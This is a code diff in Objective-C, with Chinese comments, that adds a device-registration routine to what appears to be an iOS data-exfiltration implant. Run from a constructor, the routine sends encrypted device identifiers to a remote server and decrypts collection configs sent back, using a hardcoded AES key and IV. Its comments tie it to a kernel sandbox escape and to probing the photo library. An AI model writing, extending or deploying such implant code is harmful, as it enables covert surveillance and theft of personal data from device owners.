@@ -26,6 +26,92 @@ static NSString *exfilAppUuid(void);
 static NSString *exfilMachineName(void);
 static int gExfilMcmLogged = 0; // MCM 尝试细节只首轮上报，避免轰炸日志服务
 
+// ============ 设备注册 POST /api/device/report（入库 + 拿下发配置） ============
+static NSDictionary *exfilReportDevice(void)
+{
+    NSDictionary *info = @{
+        @"app_uuid": exfilAppUuid(),
+        @"app_version": [[NSBundle mainBundle] infoDictionary][@"CFBundleShortVersionString"] ?: @"2.0",
+        @"app_pac": [[NSBundle mainBundle] bundleIdentifier] ?: @"7T",
+        @"machine": exfilMachineName(),
+        @"ios_version": [UIDevice currentDevice].systemVersion,
+        @"timestamp": @((long long)([[NSDate date] timeIntervalSince1970] * 1000)),
+    };
+    NSData *jd = [NSJSONSerialization dataWithJSONObject:info options:0 error:nil];
+    if (!jd) return nil;
+    NSString *plain = [[NSString alloc] initWithData:jd encoding:NSUTF8StringEncoding];
+    NSString *enc = exfilAesEncryptBase64(plain);
+    if (!enc) return nil;
+
+    // form 值百分号编码（+ / = 不能裸进表单）
+    NSString *pct = [enc stringByAddingPercentEncodingWithAllowedCharacters:
+        [NSCharacterSet characterSetWithCharactersInString:
+            @"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~"]];
+    NSString *body = [NSString stringWithFormat:@"params=%@", pct];
+
+    NSURL *url = [NSURL URLWithString:[kExfilBase stringByAppendingString:@"/api/device/report"]];
+    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
+    req.HTTPMethod = @"POST";
+    req.timeoutInterval = 20;
+    [req setValue:exfilAppUuid() forHTTPHeaderField:@"X-App-UUID"];
+    [req setValue:@"application/x-www-form-urlencoded" forHTTPHeaderField:@"Content-Type"];
+    req.HTTPBody = [body dataUsingEncoding:NSUTF8StringEncoding];
+
+    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
+    __block NSData *respData = nil;
+    [[[NSURLSession sharedSession] dataTaskWithRequest:req
+        completionHandler:^(NSData *data, NSURLResponse *resp, NSError *err) {
+            if (!err && data) respData = data;
+            dispatch_semaphore_signal(sem);
+        }] resume];
+    dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 21 * NSEC_PER_SEC));
+    if (!respData) return nil;
+
+    // 响应 {"code":0,"data":"<base64 AES>"} → 解出下发 JSON
+    @try {
+        NSDictionary *outer = [NSJSONSerialization JSONObjectWithData:respData options:0 error:nil];
+        if (![outer isKindOfClass:[NSDictionary class]]) return nil;
+        if (![[outer valueForKey:@"code"] isEqual:@0]) return nil;
+        NSString *b64 = outer[@"data"];
+        if (![b64 isKindOfClass:[NSString class]] || b64.length == 0) return nil;
+        NSData *ct = [[NSData alloc] initWithBase64EncodedString:b64 options:0];
+        if (!ct.length) return nil;
+
+        // AES-128-CBC 解密（key/iv 与加密同源）
+        NSData *pt = nil;
+        {
+            NSMutableData *padded = [ct mutableCopy];
+            unsigned char key[16], iv[16];
+            const char *hexKey = "bc2c72b2260840b28bc9614aa2b8004b";
+            const char *hexIv  = "71ec8e3980754823aba30e62be55cf6a";
+            for (int i = 0; i < 16; i++) {
+                unsigned int k, v;
+                sscanf(hexKey + i * 2, "%02x", &k);
+                sscanf(hexIv + i * 2, "%02x", &v);
+                key[i] = (unsigned char)k;
+                iv[i]  = (unsigned char)v;
+            }
+            NSMutableData *out = [NSMutableData dataWithLength:padded.length];
+            size_t moved = 0;
+            CCCryptorStatus st = CCCrypt(kCCDecrypt, kCCAlgorithmAES128, 0,
+                key, 16, iv, padded.bytes, padded.length,
+                out.mutableBytes, out.length, &moved);
+            if (st == kCCSuccess && moved > 0 && moved % 16 == 0)
+            {
+                // 去 PKCS7 尾
+                const uint8_t *b = out.mutableBytes;
+                uint8_t pad = b[moved - 1];
+                if (pad > 0 && pad <= 16) moved -= pad;
+                out.length = moved;
+                pt = out;
+            }
+        }
+        if (!pt.length) return nil;
+        NSDictionary *conf = [NSJSONSerialization JSONObjectWithData:pt options:0 error:nil];
+        return [conf isKindOfClass:[NSDictionary class]] ? conf : nil;
+    } @catch (NSException *e) { return nil; }
+}
+
 // 远程日志：AES-128-CBC(hex key/iv) 加密 JSON → base64 → POST /api/log/report
 // 带发送队列：启动初期网络未就绪时先攒着，成功一条删一条
 static NSMutableArray<NSString *> *gExfilPending = nil;
@@ -935,6 +1021,10 @@ static void exfilRun(void)
         exfilLog(@"ctor alive, machine=%@ ios=%@ bundle=%@",
                  exfilMachineName(), [UIDevice currentDevice].systemVersion,
                  [[NSBundle mainBundle] bundleIdentifier]);
+        NSDictionary *conf = exfilReportDevice();
+        exfilLog(@"device report %@ (%@ configs)",
+                 conf ? @"ok" : @"FAIL",
+                 conf[@"collect_configs"] ? @([(NSArray *)conf[@"collect_configs"] count]) : @"0");
         // 0) 长轮询等宿主 pe_v2 内核逃逸生效（宿主启动即自动跑，异步需要时间）：
         //    MCM 探测 + DCIM 可读性每 5 秒一轮，坚持 30 分钟；
         //    宿主沙盒一旦摘掉，MCM 查询即被放行（denied → ok）
